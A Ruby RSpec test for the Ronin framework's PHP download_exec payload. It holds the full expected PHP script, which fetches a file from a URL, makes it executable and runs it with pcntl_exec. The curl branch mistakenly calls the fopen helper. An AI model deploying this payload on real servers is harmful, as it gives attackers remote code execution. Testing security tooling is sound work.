require 'spec_helper'
require 'ronin/payloads/builtin/php/download_exec'

describe Ronin::Payloads::PHP::DownloadExec do
  it "must inherit from Ronin::Payloads::PHPPayload" do
    expect(described_class).to be < Ronin::Payloads::PHPPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'php/cmd_exec'" do
      expect(subject.id).to eq('php/download_exec')
    end
  end

  let(:url) { 'https://www.php.net/manual/en/function.fileperms.php' }

  subject do
    described_class.new(
      params: {
        url: url
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must generate PHP code which calls download_and_exec() with the 'url' param" do
      expect(subject.payload).to eq(
        <<~PHP
          <?php
          function download_via_fopen($url,$output)
          {
            $input = fopen($url,'rb');

            if (!$input)
            {
              return false;
            }

            while (!feof($input))
            {
              $chunk = fread($input,4096);

              if ($chunk === false)
              {
                return false;
              }

              if (fwrite($output,$chunk) === false)
              {
                return false;
              }
            }

            return true;
          }

          function download_via_curl($url,$output)
          {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_FILE, $output);

            $response = curl_exec($ch);

            if ($response === false)
            {
              echo "curl: " . curl_error($ch);
              return false;
            }

            return true;
          }

          function download($url)
          {
            $filename = basename($url);
            $dest = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $filename;
            $output = fopen($dest,'wb');

            if (ini_get('allow_url_fopen'))
            {
              if (download_via_fopen($url,$output) === false)
              {
                return NULL;
              }
            }
            else if (function_exists('curl_init'))
            {
              if (download_via_fopen($url,$output) === false)
              {
                return NULL;
              }
            }

            fflush($output);
            fclose($output);
            return $dest;
          }

          function download_and_exec($url)
          {
            $path = download($url);

            if ($path === NULL)
            {
              return false;
            }

            $perms = fileperms($path);
            chmod($path,$perms | 0700);

            if (pcntl_fork() == 0)
            {
              pcntl_exec($path);
              exit(0);
            }

            return true;
          }

          download_and_exec(#{url.to_s.dump});
          ?>
        PHP
      )
    end
  end
end
